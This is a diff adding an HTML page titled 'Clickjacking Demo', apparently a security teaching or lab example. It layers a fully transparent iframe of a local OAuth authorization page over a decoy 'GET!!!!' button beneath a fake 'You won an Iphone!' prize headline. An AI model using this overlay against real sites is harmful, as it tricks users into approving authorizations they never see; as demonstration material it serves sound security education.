@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clickjacking Demo</title>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    <style>
+        .frame-container {
+            position: relative;
+            width: 100%;
+            height: 500px;
+        }
+
+        iframe {
+            width: 100%;
+            height: 100%;
+            /* opacity: 0.5; */
+            opacity: 0.0;
+            position: absolute;
+            top: 0;
+            left: 0;
+            border: none;
+            z-index: 100;
+        }
+
+        .deceptive-button {
+            position: absolute;
+            top: 225px;
+            left: 530px;
+            /* z-index: 200; */
+        }
+    </style>
+</head>
+<body>
+    <h1 id="header">
+        Congratulations! You won an Iphone!
+    </h1>
+    <div class="frame-container">
+        <iframe src="authorization-page.html" id="oauthFrame"></iframe>
+        <button id="get" class="btn btn-primary deceptive-button">GET!!!!</button>
+    </div>
+
+    <script>
+        document.querySelector('#get').addEventListener('click', function() {
+            alert('Get');
+        });
+    </script>
+
+    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.0/js/all.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+
+</body>
+</html>
